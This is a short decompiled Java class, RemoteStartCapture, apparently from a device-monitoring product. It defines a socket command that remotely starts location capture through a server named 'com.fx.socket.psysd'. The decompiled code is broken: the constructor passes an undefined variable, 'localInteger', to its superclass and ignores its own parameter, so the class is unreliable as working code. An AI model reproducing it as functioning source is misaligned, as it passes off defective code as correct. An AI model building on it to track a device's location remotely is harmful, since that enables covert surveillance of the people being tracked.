package com.vvt.capture.location.ref.command;

import com.fx.socket.SocketCmd;

public class RemoteStartCapture
  extends SocketCmd
{
  private static final long serialVersionUID = -4924766994872831800L;
  
  public RemoteStartCapture(int paramInt)
  {
    super(localInteger, Boolean.class);
  }
  
  protected String getServerName()
  {
    return "com.fx.socket.psysd";
  }
  
  protected String getTag()
  {
    return "RemoteStartCapture";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/location/ref/command/RemoteStartCapture.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */